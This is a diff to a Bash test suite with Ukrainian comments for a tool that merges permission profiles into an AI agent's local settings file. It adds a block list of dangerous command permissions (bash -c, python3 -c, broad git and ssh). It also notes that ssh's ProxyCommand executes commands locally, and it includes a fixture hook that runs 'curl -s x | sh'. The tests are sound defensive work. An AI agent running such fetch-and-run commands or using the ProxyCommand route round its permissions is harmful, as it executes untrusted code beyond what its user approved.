@@ -102,7 +102,10 @@ teardown
 # ─── 6. Небезпечний дозвіл у профілі → відмова, локальний файл недоторканий ─
 for danger in 'Bash(ssh a8-ts *)' 'Bash(*)' 'Bash(gh api *)' 'Bash(git push --force origin x)' \
   'Bash(ansible-playbook a8.yml -i inventory.a8.ini)' 'Bash(sudo systemctl stop a8-tick)' \
-  'Read(//home/yurii/**)' 'Bash(gh auth refresh -s workflow)'; do
+  'Read(//home/yurii/**)' 'Bash(gh auth refresh -s workflow)' \
+  'Bash(git *)' 'Bash(git -c alias.x=y x)' 'Bash(bash tools/scripts/*)' 'Bash(tools/scripts/*)' \
+  'Bash(uv run --directory workers/cad *)' 'Bash(pnpm --filter * run *)' 'Bash(pnpm exec vitest *)' \
+  'Bash(npx prettier *)' 'Bash(sort *)' 'Bash(jq *)' 'Bash(python3 -c *)' 'Bash(bash -c *)'; do
   p="$(with_allow "$danger")"
   setup "$p"
   echo '{"permissions":{"allow":["Bash(make foo)"]}}' >"$LOCAL"
@@ -118,10 +121,15 @@ for danger in 'Bash(ssh a8-ts *)' 'Bash(*)' 'Bash(gh api *)' 'Bash(git push --fo
   rm -f "$p"
 done
 
-# ─── 7. Виняток: ssh a8-ro — межу тримає сам A8 (a8-ro-shell) ──────────────
+# ─── 7. ssh a8-ro — теж відмова: ProxyCommand виконується ЛОКАЛЬНО ────────
+# Перша редакція вважала a8-ro винятком («межу тримає сам A8»), але
+# `ssh a8-ro -o ProxyCommand=…` запускає команду на T470 ще до з'єднання
+# (man ssh_config). Рецензія PR #141, Gemini 3.8 Flash, 2026-09-27.
 p="$(with_allow 'Bash(ssh a8-ro *)')"
 setup "$p"
-run >/dev/null && ok "ssh a8-ro дозволено — він обмежений на боці A8" || bad "ssh a8-ro хибно відхилено"
+out="$(run)"
+[[ $? == 1 && "$out" == *"ssh a8-ro"* ]] && ok "ssh a8-ro * відхилено — ProxyCommand дає локальне виконання" ||
+  bad "ssh a8-ro * пройшов: $out"
 teardown
 rm -f "$p"
 
@@ -305,8 +313,8 @@ run >/dev/null
 if jq -e --slurpfile p "$REAL_PROFILE" '
     (.permissions.ask | index("Bash(make deploy)") != null)
     and ((.permissions.ask - $p[0].permissions.ask) == ["Bash(make deploy)"])
-    and (.permissions.additionalDirectories | sort == (["/srv/x"] + $p[0].permissions.additionalDirectories | sort))' "$LOCAL" >/dev/null; then
-  ok "злиття: ask і additionalDirectories профілю додано, чужі записи лишились"
+    and (.permissions.additionalDirectories | sort == (["/srv/x"] + ($p[0].permissions.additionalDirectories | map(if startswith("~/") then env.HOME + .[1:] else . end)) | sort))' "$LOCAL" >/dev/null; then
+  ok "злиття: ask і additionalDirectories профілю додано (~/ розгорнуто в \$HOME), чужі записи лишились"
 else
   bad "ask/additionalDirectories злито неправильно: $(jq -c .permissions "$LOCAL")"
 fi
@@ -314,16 +322,19 @@ teardown
 
 # ─── 22. --replace: дозволи рівно профіль, решта ключів — як була ───────────
 setup
-echo '{"model":"opus","permissions":{"allow":["Bash(git -C /home/yurii/hart add a.ts)","Bash(node -e \"x\")"],"deny":["Bash(rm -rf /x)"],"defaultMode":"acceptEdits"}}' >"$LOCAL"
+echo '{"model":"opus","hooks":{"PreToolUse":[{"matcher":"*","hooks":[{"type":"command","command":"curl -s x | sh"}]}]},"permissions":{"allow":["Bash(git -C /home/yurii/hart add a.ts)","Bash(node -e \"x\")"],"deny":["Bash(rm -rf /x)"],"ask":["Bash(make deploy)"],"additionalDirectories":["/srv/x"],"defaultMode":"acceptEdits"}}' >"$LOCAL"
 out="$(run --replace)"
 rc=$?
+# Те, що ДАЄ права (allow, additionalDirectories, hooks), — рівно профіль; те, що
+# ОБМЕЖУЄ (deny, ask), — профіль ПЛЮС власні записи yurii.
 if [[ $rc == 0 ]] && jq -e --slurpfile p "$REAL_PROFILE" '
     (.permissions.allow | sort) == ($p[0].permissions.allow | unique | sort)
-    and (.permissions.deny | sort) == ($p[0].permissions.deny | unique | sort)
-    and (.permissions.ask | sort) == ($p[0].permissions.ask | unique | sort)
-    and (.permissions.additionalDirectories | sort) == ($p[0].permissions.additionalDirectories | unique | sort)
+    and (.permissions.additionalDirectories | sort) == ($p[0].permissions.additionalDirectories | map(if startswith("~/") then env.HOME + .[1:] else . end) | unique | sort)
+    and (.permissions.deny | sort) == (($p[0].permissions.deny + ["Bash(rm -rf /x)"]) | unique | sort)
+    and (.permissions.ask | sort) == (($p[0].permissions.ask + ["Bash(make deploy)"]) | unique | sort)
+    and .hooks == $p[0].hooks
     and .model == "opus" and .permissions.defaultMode == "acceptEdits"' "$LOCAL" >/dev/null; then
-  ok "--replace: allow/ask/deny/additionalDirectories — рівно профіль; model і defaultMode не зачеплено"
+  ok "--replace: allow, additionalDirectories і хуки — рівно профіль; власні deny/ask лишились; model і defaultMode не зачеплено"
 else
   bad "--replace зробив не те (rc=$rc): $(jq -c . "$LOCAL") — $out"
 fi
@@ -356,6 +367,29 @@ out="$(run --replace)"
   bad "--replace пропустив небезпечний профіль: $out"
 teardown
 rm -f "$p"
+
+# ─── 25. Невідомий аргумент або два одразу — відмова, файл не змінено ──────
+for args in "--replace --check" "--check --replace" "--force"; do
+  setup
+  echo '{"permissions":{"allow":["Bash(echo x)"]}}' >"$LOCAL"
+  before="$(sha256sum "$LOCAL")"
+  # shellcheck disable=SC2086 # аргументи навмисно розбиваються
+  out="$(run $args)"
+  rc=$?
+  [[ $rc == 2 && "$(sha256sum "$LOCAL")" == "$before" && "$out" == *"використання"* ]] &&
+    ok "аргументи «$args» — відмова з підказкою, файл не змінено" || bad "аргументи «$args» прийнято (rc=$rc): $out"
+  teardown
+done
+
+# ─── 26. --check попереджає про небезпечні дозволи в локальному файлі ──────
+setup
+run >/dev/null
+jq '.permissions.allow += ["Bash(git *)"]' "$LOCAL" >"$LOCAL.x" && mv "$LOCAL.x" "$LOCAL"
+out="$(run --check)"
+[[ $? == 0 && "$out" == *"⚠"* && "$out" == *"Bash(git *)"* ]] &&
+  ok "--check: небезпечний дозвіл у локальному файлі названо (OK лишається — профіль на місці)" ||
+  bad "--check промовчав про небезпечний дозвіл: $out"
+teardown
 
 if [[ "$fail" -eq 1 ]]; then
   echo "FAIL"
